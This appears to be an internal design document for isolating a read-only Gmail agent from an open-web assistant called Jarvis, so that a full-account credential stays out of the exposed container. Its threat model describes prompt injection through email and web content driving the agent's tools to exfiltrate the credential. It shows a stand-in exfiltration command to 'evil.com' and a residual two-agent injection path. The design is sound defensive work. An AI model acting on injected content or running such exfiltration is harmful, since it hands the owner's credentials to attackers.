# Isolated Mail-Agent for Jarvis Gmail — Design

**Date:** 2026-08-01
**Status:** approved (owner), not yet implemented
**Related:** `docs/superpowers/specs/…` , memory `project_jarvis_gmail_connector`, `reference_vds_credential_proxy`

## Goal

Give Jarvis access to the owner's **work** Gmail via the native claude.ai Gmail connector,
**without** placing the full-account credential inside the open-web Jarvis container.

## Why (threat model)

The native connector requires a real Claude-account credential mounted in the container
(the credential-proxy is Anthropic-only and its `placeholder` token kills the connector —
proven). That credential is **full-account** power (all connectors, billing), not Gmail-scoped.

Jarvis reads untrusted content (email bodies, arbitrary web pages) and has open-web tools
(Bash/`curl`, web fetch). A prompt injection in that content could drive Jarvis's own tools to
exfiltrate the credential file. The transport sender-whitelist blocks chat injection but **not**
email/web content — that is the new surface. Egress-filtering Jarvis is impossible because Jarvis
legitimately browses the open web.

**In-process subagent (Task tool) does NOT isolate** — it runs inside Jarvis's container, sharing
its open-web network and now the token. Isolation requires a **separate container**.

## Architecture

Two separate nanoclaw agent-containers, talking across the boundary via **a2a** (the only channel
between isolated containers — no shared memory/IPC):

```
  ┌────────────── jarvis ──────────────┐        ┌──────────── mail-agent ────────────┐
  │ open web, all tools                 │ a2a    │ NO open web (egress locked)         │
  │ NO account credential               │──────▶ │ holds /data cred + native connector │
  │ publishes: mail_request             │ mail_  │ tools: READ-ONLY gmail              │
  │ a2a_in:   mail_result               │ request│ a2a_in: mail_request                │
  │                                     │◀────── │ publishes: mail_result              │
  └─────────────────────────────────────┘ mail_  └─────────────────────────────────────┘
                                          result
```

- **mail-agent**: own container; mounts `/home/nanoclaw/gmail-cfg → /data`, `HOME=/data`,
  **skips the credential-proxy** (uses the mounted real creds directly); **egress locked** to
  `api.anthropic.com`, `*.googleapis.com` (gmail), `claude.ai`; tool allowlist = **read-only**
  Gmail (`search_threads`, `get_message`, `get_thread`, `list_labels`). Headless (no channel).
- **jarvis**: unchanged network (open web), **no credential**; routes email tasks to mail-agent
  via a2a and gets content back.

Defense layers on the token:
1. Egress lock → injected `curl token→evil.com` cannot connect.
2. Native connector has **no send tool** (only `create_draft`), and mail-agent allowlists read-only
   → cannot email the token out.
3. Separate container → Jarvis's open web never touches the token.

**Residual (accepted):** mail-agent could embed the token in its a2a `mail_result` text → Jarvis
(open web) exfils. Two-step (both agents must be injected) — high bar. Best achievable without a
dedicated Claude account (owner declined a dedicated account).

## Components / tasks

1. **New agent group `mailman`** (headless). Scaffold via new-agent recipe. CLAUDE.md: read-only
   mail reader, answers `mail_request` with `mail_result`, never emits credentials.
2. **container-runner.ts** (host): per-group opt-in config for "mounted-cred mode":
   - mount a host dir → `/data`, set `HOME=/data`,
   - **skip** proxy env (lines ~750–756),
   - apply **egress restriction**.
   New `container_configs` fields (e.g. `credConfigMount`, `egressAllowlist`).
3. **Egress mechanism (the hard part — decision needed).**
   - **Recommended:** tiny forward-proxy container (squid/tinyproxy) on an internal Docker network,
     `CONNECT` allowlist `{api.anthropic.com, *.googleapis.com, claude.ai}:443`; mail-agent gets
     `HTTPS_PROXY`/`NO_PROXY` pointing at it. No `NET_ADMIN`, host-independent.
   - **Risk to test:** does claude-code + the connector's HTTPS client honor `HTTPS_PROXY`? Verify
     before committing to this path. Fallback: nftables egress on the container (`--cap-add
     NET_ADMIN`), IP-based (googleapis IPs vary → messier).
4. **agent-runner claude.ts**: add the 4 read-only gmail tools to `TOOL_ALLOWLIST` (inert for agents
   that don't mount the connector; write/draft tools intentionally NOT added anywhere).
5. **a2a contract** (`shared/a2a/kinds.ts` — image rebuild): `mail_request` (fields: query/intent),
   `mail_result` (fields: summary/messages). Descriptors: jarvis `publishes mail_request` /
   `a2a_in mail_result`; mailman `a2a_in mail_request` / `publishes mail_result`. `ncl groups lint` 0.
6. **jarvis instructions**: route email tasks to mailman via a2a.
7. **Deploy**: build host + rebuild image (shared/ + any egress bits) + restart; wire a2a; verify
   Jarvis→mailman→work inbox end-to-end. Do NOT generalize mounted-cred mode to other agents.

## Phasing (checkpoint before prod-mutating / build steps)

- **P0** egress-proxy spike: verify claude-code honors `HTTPS_PROXY` against the connector (cheap
  container test on VDS). Gates the whole egress approach.
- **P1** host code: container-config fields + container-runner mount/HOME/proxy-skip/egress.
- **P2** agent-runner allowlist (read-only gmail).
- **P3** a2a kinds + descriptors + lint (image rebuild).
- **P4** scaffold mailman group + CLAUDE.md; jarvis routing instructions.
- **P5** deploy + end-to-end verify + memory update.

## Non-goals / decisions

- Personal Gmail (self-hosted MCP) — **later**, separate work.
- Dedicated Claude account — **declined** by owner.
- Generalizing mounted-cred to all agents — **no** (one shared token across all = worst case).
